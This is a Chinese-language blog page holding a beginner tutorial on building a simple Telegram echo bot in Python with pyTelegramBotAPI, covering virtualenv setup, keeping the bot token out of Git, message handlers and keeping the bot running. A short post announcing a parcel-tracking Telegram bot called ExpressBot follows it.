<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>假定读者们都知道Telegram是什么，会翻墙并且掌握一定的Python基础。在本系列中我使用Python 2.7和PyCharm，如果要是用Python 3的话最好用Python 3.6</p>
<p>本系列可能会有部分内容翻译自Telegram官方网站，可是官网对于API的说明<strong>非常简明易懂</strong>，而且有的地方还很幽默。<strong>如果英语水平连这都看不懂、理解苦难的话，那说句实在话（不是打击大家），<a target="_blank" rel="noopener" href="https://dmesg.app/other-than-tech.html">还是尽早转行吧</a>。</strong></p>
<p>所以有的时候我也很纠结，我写这一系列干嘛啊，吃饱了没事干么？</p>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>未完待定</p>
<h2 id="什么是bot（机器人）"><a href="#什么是bot（机器人）" class="headerlink" title="什么是bot（机器人）"></a>什么是bot（机器人）</h2><p>机器人是一种特殊的不额外需要手机号码的账号。用户可以通过给机器人发消息来进行交互。哎呀反正你们都知道啦。</p>
<p>机器人和普通用户有何不同呢？</p>
<p>机器人没有在线状态、没有上次在线时间；</p>
<p>机器人的存储空间是有限的；</p>
<p>机器人不能主动和用户开启会话，换句话说，要用户先跟它说（或者是添加到群里），他才能回消息；</p>
<p>机器人的用户名结尾永远是bot；</p>
<p>把机器人加到群里的时候，默认情况下（开启隐私模式），机器人是不会收到所有的消息的；</p>
<p>机器人不吃不喝，不睡觉也不抱怨（除非编码太垃圾分分钟抛异常?）。</p>
<h2 id="如何创建一个机器人"><a href="#如何创建一个机器人" class="headerlink" title="如何创建一个机器人"></a>如何创建一个机器人</h2><p>很简单，跟<a target="_blank" rel="noopener" href="https://telegram.me/botfather">BotFather</a>说话，他会指引你创建一个机器人。真的是太简单了，大家去<a target="_blank" rel="noopener" href="https://core.telegram.org/bots">官网自己看</a>吧。</p>
<p>在此系列中，我创建一个名为@benny_demo_bot的机器人，TOKEN为XXX我当然不会告诉你啦。</p>
<p>并且，我使用<code>Edit commands</code>添加了如下命令（start、help、settings是全局命令）：</p>
<blockquote>
<p>start - 自我介绍</p>
<p>help - 帮助</p>
<p>talk - 聊天</p>
</blockquote>
<p><img src="/images/102017_1429_Telegrambot1.png"></p>
<h2 id="搭建开发环境"><a href="#搭建开发环境" class="headerlink" title="搭建开发环境"></a>搭建开发环境</h2><p>众所周知的是，Python可以使用pip来安装一些非常好用的第三方库。这里我们使用了<a target="_blank" rel="noopener" href="https://github.com/eternnoir/pyTelegramBotAPI">pyTelegramBotAPI</a>来和Telegram API进行交互。实际上你想用curl也没人拦着你。</p>
<p>为啥不用另一个star更多的库？我嫌弃那个库麻烦不好用。</p>
<h3 id="准备virtual-environment与pyTelegramBotAPI"><a href="#准备virtual-environment与pyTelegramBotAPI" class="headerlink" title="准备virtual environment与pyTelegramBotAPI"></a>准备virtual environment与pyTelegramBotAPI</h3><p>Virtual environment就是一个虚拟出来的纯净的、不包含第三方库的Python环境（想包含本地已安装的，也不是不行）。</p>
<p>为什么要使用virtual environment呢？唔是这样的，pip默认会把库安装到系统里对应的site-packages里，这样无论你在哪打开Python，都是可以用这个库的。这样听起来好像挺好，但实际上还是有一些弊端的。比如说，在一些项目中，我们最后需要整理出来一个这个项目使用了哪些第三方库，然后指引用户去安装这些库。一个两个还好，多了的话，恐怕开发者也容易找不全、漏掉一些库吧。再加上一些库的依赖、版本等问题，所以如果有必要，那么一定要使用virtual Environment的。</p>
<p>所以我们先创建virtual environment吧。有好几种方式，这里我们就说两种：命令行方式和IDE方式</p>
<h4 id="命令行方式"><a href="#命令行方式" class="headerlink" title="命令行方式"></a>命令行方式</h4><p>首先我们需要安装virtual environment，用<code>pip</code>就可以了，网上教程很多，这里我就简述一下。</p>
<p>pip install virtualenv</p>
<p>如果你使用某些Linux发行版，可能会提示<code>pip: command not found</code>，如果是Debian系的话，那么运行：</p>
<p>sudo apt install python-pip</p>
<p>之后我们创建一个目录，使之成为工程目录：</p>
<p>mkdir bot_demo<br>cd bot_demo<br>#创建virtualenv<br>virtualenv ENV<br>#激活virtualenv（Windows）<br>ENV\Scripts\activate<br>#激活virtualenv（Linux）<br>source ENV&#x2F;bin&#x2F;activate</p>
<p>此时命令行前面会变成(ENV)，代表着已经进入了。这个时候再运行pip就会安装到虚拟环境中</p>
<p>pip install pyTelegramBotAPI</p>
<h4 id="IDE方式"><a href="#IDE方式" class="headerlink" title="IDE方式"></a>IDE方式</h4><p>使用IDE相比来说很方便。我们只需要新建一个项目，File - Settings - Project interpreter,右侧的齿轮里即可选择create VirtualEnv</p>
<p><img src="/images/102017_1429_Telegrambot2.png"></p>
<p>我建议将VirtualEnv选择到工程目录下，这样方便我们判断哪个VirtualEnv对应哪个项目。当然，如果你打算把代码push到GitHub，记得把这个目录加到<code>.gitignore</code>里。</p>
<p>之后我们点击加号，安装<code>pyTelegramBotAPI</code>这个package，PyCharm就会自动为我们安装好这个包了。</p>
<p><img src="/images/102017_1429_Telegrambot3.png"></p>
<h2 id="开始你的项目"><a href="#开始你的项目" class="headerlink" title="开始你的项目"></a>开始你的项目</h2><h3 id="我该怎么处理我的TOKEN"><a href="#我该怎么处理我的TOKEN" class="headerlink" title="我该怎么处理我的TOKEN"></a>我该怎么处理我的TOKEN</h3><p>为了方便项目的扩展，咱一般都会把配置信息放在一个Python文件中。但是，咱知道，像TOKEN这类东西都是比较敏感的，如果要打算把代码push到GitHub，那么<strong>很容易就会泄露这类敏感信息</strong>。也千万别以为删除这些信息了就万事大吉了。要知道<strong>时光机可是Git的能力之一</strong>。万一不幸发生了这种事情，推荐大家用BFG抹掉历史纪录，详细教程可以<a target="_blank" rel="noopener" href="https://dmesg.app/git-password.html">参考我</a>。</p>
<p>那从头开始预防这件事，咱该怎么做呢？一个非常愚蠢但是有效的办法是，新建一个名为<code>config.py</code>的文件，此文件用于保存你的配置信息，并将其加到<code>.gitignore</code>中，另外复制一个名为<code>config-example.py</code>，此文件内容与<code>config.py</code>一致，只是不包含TOKEN敏感信息。</p>
<p>为什么咱不直接把<strong>不包含</strong>敏感信息的<code>config.py</code>先push上去，然后加入自己的TOKEN，之后再加入到<code>.gitignore</code>中呢？其实这样要倍加小心，哦是这样的，gitignore管不到已经在历史记录中的文件的。</p>
<p>另外，如果你使用私有仓库（并且打算以后公开），那就更简单了。可以什么都不管直接push上去，再打算公开之前抹掉TOKEN再push，然后用BFG抹掉历史记录再force push就可以了。</p>
<p>另一个更好的办法是，创建一个<code>config.py</code>但是不在这里写入真实的配置信息，转而设置环境变量然后用<code>os.environ</code>加判断获取到对应的KEY，如果使用PyCharm的话，在Run&#x2F;Debug configuration里就可以添加环境变量，当然直接在命令行里设置也可以（windows要用<code>set xxx=&#39;123&#39;</code>, Linux直接<code>export xxx=&#39;123&#39;</code>设置可以考虑写入<code>.bashrc</code>里）</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/10/2017112102585531.jpg"><img src="/images/2017112102585531-300x116.jpg"></a></p>
<h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3><p>这里由于只是一个演示，并不打算push到GitHub，所以就不处理TOKEN啦。</p>
<p>很显然，我们需要一个<code>config.py</code>用于保存配置文件，还需要一个”主程序”，这里我就很无耻的叫它<code>main.py</code>啦。</p>
<p><img src="/images/102017_1429_Telegrambot4.png"></p>
<p>一些解释：</p>
<p>第一行的<code>#!/usr/bin/python</code>用于指定当给文件加x权限并执行时(<code>./main.py</code>)该使用哪个解释器，用法和shell编程中的是一样的；</p>
<p>第二行用于指定编码格式，下面则是注释说明与doc啦。大家不好奇这些是怎么来的吗？实际上是IDE自动生成的啦。我才懒得自己打这些玩意。</p>
<p>在设置中的如下位置即可设定模板，更多信息可以参考<a target="_blank" rel="noopener" href="https://www.jetbrains.com/help/pycharm/creating-and-editing-file-templates.html">JetBrains</a>官网。</p>
<p><img src="/images/102017_1429_Telegrambot5.png"></p>
<h3 id="config-py"><a href="#config-py" class="headerlink" title="config.py"></a>config.py</h3><p>显然我们要在这里放入TOKEN，所以我们直接写一行<code>TOKEN=&#39;XXX&#39;</code>即可。我一般习惯把这类变量全大写，给人“常量”的感觉嘛（实际上Python中是没有常量这个概念的）。如下所示</p>
<p><img src="/images/102017_1429_Telegrambot6.png"></p>
<p>看这时间戳，我写一篇文章容易嘛我！几个小时了……</p>
<h3 id="main-py"><a href="#main-py" class="headerlink" title="main.py"></a>main.py</h3><p>首先我们需要import库和我们的配置文件并创建telebot类的实例</p>
<p>import telebot<br>from config import TOKEN<br>bot &#x3D; telebot.TeleBot(TOKEN)</p>
<p>定义接受&#x2F;start和命令的消息处理函数，如果多个命令都用这一个函数处理，就这样<code>[&#39;start&#39;,&#39;help&#39;]</code></p>
<p>@bot.message_handler(commands&#x3D;[‘start’])<br>def send_welcome(message):<br>    bot.send_message(message.chat.id, ‘大家好，我是机器人’)</p>
<p>定义接受所有消息的处理函数</p>
<p>@bot.message_handler()<br>def echo(message):<br>    bot.reply_to(message, message.text)</p>
<p>另一种reply_to</p>
<p>@bot.message_handler(commands&#x3D;[‘help’])<br>def send_welcome(message):<br>    bot.send_message(reply_to_message_id&#x3D;message.message_id, chat_id&#x3D;message.chat.id, text&#x3D;’有什么可以帮您’)</p>
<p>定义程序的入口：</p>
<p>if __name__ &#x3D;&#x3D; ‘__main__‘:<br>    bot.polling()</p>
<p>我来解释一下：</p>
<h4 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h4><p>在每个函数前面，我们可以看到有一个<code>@bot.message_handler</code>，这其实是一个Python装饰器。装饰器其实是一个起初听起来觉得什么用都没有、但是用起来却很方便的高阶Python功能。简单说，装饰器可以在运行时改变或增加函数的功能。此话怎讲？</p>
<p>比如说，我们需要在函数开始运行、结束运行的时候输出消息到控制台，大家可能会想着在函数开始和结尾加两个<code>print</code>。没错这样是可以的，但是假如我们有10个函数呢？这代码都没能重用，删除的时候还要删除20次。由于函数在Python中是一等公民，我们可以定义一个嵌套函数（也就是装饰器），配合Python的语法糖@来实现这一功能。</p>
<p>在我们说的打印日志这个例子中，装饰器就可以这么写这么用：</p>
<p><img src="/images/102017_1429_Telegrambot7.png"></p>
<p>当然在这个例子中，这个装饰器无法处理带参数的函数。要处理函数的参数，我们需要在内层的<code>wrapper</code>的参数中使用<code>*args</code>和<code>**kwargs</code>来处理参数（和关键字参数），关于装饰器更多的内容，可以参考奔跑的蜗牛壳<a target="_blank" rel="noopener" href="https://www.tougetu.com/2017/02/python-decorator.html">《Python 装饰器》</a></p>
<h4 id="message"><a href="#message" class="headerlink" title="message"></a>message</h4><p>Telegram API会返回给我们一组JSON，但是控制台用<code>print</code>打印出来的JSON都是一行，看起来很不舒服，解决方法是使用<code>pprint</code>或者新建一个扩展名为json的文件，将一行json放入，Ctrl + Alt + L格式化。</p>
<p>在message这个参数中，有几个是比较重要的，我说几个个人比较常用的：</p>
<p><code>message.chat.id</code> 类型为int，聊天ID，如果是和机器人私聊，那么这个ID也就是用户的user_id；如果是群组的话，那么就是群组的id</p>
<p><code>message.text</code> 类型为unicode，用户发给机器人的聊天内容</p>
<p><code>message.message_id</code> 类型为int，用户发给机器人的消息编号，再使用”回复”功能时会用到这个编号。</p>
<h4 id="send-message与reply-to-message"><a href="#send-message与reply-to-message" class="headerlink" title="send_message与reply_to_message"></a>send_message与reply_to_message</h4><p><code>send_message</code>用于给用户发送消息，必须要有至少两个参数，一个是<code>chat_id</code>，一个是text；</p>
<p><code>reply_to</code>则是回复某条消息，是<code>send_message(message.chat.id, text, reply_to_message_id=message.message_id, **kwargs)</code>的方便用法，需要两个参数，一个是message，一个是回复的内容；</p>
<p>如果我们要用<code>send_message</code>来实现<code>relpy_to_message</code>，那么就要手动用关键字参数指定回复哪条消息，如代码中的help命令所示。</p>
<h4 id="if-name-x3D-x3D-‘-main-‘"><a href="#if-name-x3D-x3D-‘-main-‘" class="headerlink" title="if __name__ &#x3D;&#x3D; ‘__main__‘:"></a>if __name__ &#x3D;&#x3D; ‘__main__‘:</h4><p>这一行则定义了这个Python程序的入口，在他下面运行<code>bot.polling()</code>方法。这个方法可神奇了呢，他会帮你处理各种事件，自动帮你从API里取回消息，基本不用你干预。</p>
<p>如果我们不用<code>__name__</code>控制的话，那么当在其他文件中import时，也就顺便运行这个文件啦。这很明显不是我们想要的结果。</p>
<h2 id="运行与调试"><a href="#运行与调试" class="headerlink" title="运行与调试"></a>运行与调试</h2><p>如果一切顺利的话，当你点击运行时，跟机器人说话，它就会回复你啦。当然啦，运行（run）与调试（debug）其实还是有些区别的，关于这的一些技巧，我们可以以后再谈~</p>
<p><img src="/images/102017_1429_Telegrambot8.png"></p>
<p>哦对了，我们还需要导出依赖，方便别人也能够用啊！</p>
<p>很简单，进入到virtual env，运行如下命令：</p>
<p>pip freeze &gt; requirements.txt</p>
<p>别人用的时候，<code>pip install -r requirements.txt</code>就可以安装对应的依赖啦。</p>
<h2 id="我该怎么长期运行我的机器人呢"><a href="#我该怎么长期运行我的机器人呢" class="headerlink" title="我该怎么长期运行我的机器人呢"></a>我该怎么长期运行我的机器人呢</h2><p>这个问题问得好！首先你得有个在海外的服务器（或者让程序走代理），可以考虑用用<code>nohup</code>或者<code>screen</code>，这样当你关掉终端之后，程序还会继续运行。呃，那些用Windows做服务器的，当我什么都没说好了。</p>
<p>当然了正经的办法，是要用systemd或者supervisor的。具体可以<a target="_blank" rel="noopener" href="https://dmesg.app/linux-keep-running.html">参考这里</a></p>
<h2 id="我想要任务计划机器人，怎么办"><a href="#我想要任务计划机器人，怎么办" class="headerlink" title="我想要任务计划机器人，怎么办"></a>我想要任务计划机器人，怎么办</h2><p>这个问题问得也很好。我们可能需要某种机器人，每十分钟给用户发送一条消息。</p>
<p>此时我的建议是，<strong>如果需求很简单，那么使用操作系统自带的任务计划功能</strong>来执行脚本（Linux为cron）。</p>
<p>可能有人会有反对意见了。Python里有很多优秀的任务调度、任务计划库，比如说apscheduler。这样也是可以的，只不过需要多写点代码！</p>
<p>当然了，有些时候我们的需求比较灵活，操作系统提供的任务计划用起来会很麻烦，此时就只能用一些任务调度的库啦。</p>
<h2 id="下一篇打算讲点什么呢"><a href="#下一篇打算讲点什么呢" class="headerlink" title="下一篇打算讲点什么呢"></a>下一篇打算讲点什么呢</h2><p>如果我们的机器人只能以固定的模式讲话，那么显然是不行的！</p>
<p>那么下一篇，我们就要尝试着接入其他服务（使用pycurl发送POST或者GET请求），操作数据库，给机器人加入”正在输入”的特效，更加深入的理解Telegram Bot API。当然了，我下一篇说不定等到啥时候，所以，别太期待。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/10/20/tgbot0/index/" data-id="clhp7rtld009ms2qrgatk5z7n" data-title="[Telegram bot系列]0：用Python写一个Telegram Bot 简单的回话bot" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-expressbot/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/10/18/expressbot/index/" class="article-date">
  <time class="dt-published" datetime="2017-10-18T00:00:00.000Z" itemprop="datePublished">2017-10-18</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/share/">share</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/10/18/expressbot/index/">ExpressBot：一个可以帮你查快递、追踪快递状态、还能陪聊的Telegram bot</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>大家好，小土豆我又来水贴了。</p>
<p>这是一个能够帮你查快递、追踪快递状态的Telegram机器人。当然，还能陪聊，你跟他说语音也能听懂，什么都能聊，查个天气什么的也不在话下~~</p>
<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="查询快递"><a href="#查询快递" class="headerlink" title="查询快递"></a>查询快递</h3><p>接口来自于快递100，差不多能查个七八百家的样子？</p>
<h3 id="查询历史"><a href="#查询历史" class="headerlink" title="查询历史"></a>查询历史</h3><p>反正是都能看到的啦，也可以删除的</p>
<h3 id="追踪快递状态"><a href="#追踪快递状态" class="headerlink" title="追踪快递状态"></a>追踪快递状态</h3><p>只要是未妥投的，都会十分钟查询一次，如有更新会发消息给你~好像就这一个亮点了。</p>
<h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><p>随意的截几个好了~</p>
<p><img src="/images/101817_0558_ExpressBot1.png"></p>
<p><img src="/images/101817_0558_ExpressBot2.png"></p>
<p><img src="/images/101817_0558_ExpressBot3.png"></p>
<p>估计bug多多，被<a target="_blank" rel="noopener" href="https://blog.yandere.moe/">Yandere@萌</a>调戏炸了好几次</p>
<h2 id="以后打算干嘛"><a href="#以后打算干嘛" class="headerlink" title="以后打算干嘛"></a>以后打算干嘛</h2><p>让这个bot来跟人扯淡闲聊呗~</p>
<h2 id="开源地址及部署方法"><a href="#开源地址及部署方法" class="headerlink" title="开源地址及部署方法"></a>开源地址及部署方法</h2><p>[gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/ExpressBot'/]%E5%BC%80%E6%BA%90%E5%9C%B0%E5%9D%80/[/gt/]">https://github.com/BennyThink/ExpressBot&#39;\]开源地址\[/gt\]</a> 初学Python，还望多多指教；欢迎star、fork、PR；还望有能力的大神能够帮我进行安全审计和健壮性测试</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/10/18/expressbot/index/" data-id="clhp7rtg8002ks2qr7ss4htue" data-title="ExpressBot：一个可以帮你查快递、追踪快递状态、还能陪聊的Telegram bot" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/11/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><span class="space">&hellip;</span><a class="page-number" href="/page/23/">23</a><a class="extend next" rel="next" href="/page/13/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/china/">china</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/china/justsay/">justsay</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/cloudflare/">cloudflare</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/gfw/">gfw</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/">it</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/it/justsay/">justsay</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/security/">security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/share/">share</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/">justsay</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/gfw/">gfw</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/security/">security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/website/">website</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/program/">program</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/program/share/">share</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/">security</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/security/justsay/">justsay</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/share/">share</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/website/">website</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/website/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/what/">what</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/what/gfw/">gfw</a></li></ul></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/" rel="tag">ubuntu</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/08/">August 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/09/21/one-api-clickhouse/index/">one-api/new-api性能优化：使用 ClickHouse 作为日志系统</a>
          </li>
        
          <li>
            <a href="/2024/08/03/stripe-fraud/index/">Stripe 如何安全收款并避免盗刷与测卡</a>
          </li>
        
          <li>
            <a href="/2024/07/27/hide-in-cf/index/">隐藏于 Cloudflare 的全球网络之中</a>
          </li>
        
          <li>
            <a href="/2024/07/17/azure-waf/index/">救命！我的 Azure Front Door WAF 规则不生效怎么办！</a>
          </li>
        
          <li>
            <a href="/2024/07/16/azure-fd/index/">使用Azure Front Door 和 Load Balancer</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 Benny小土豆<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>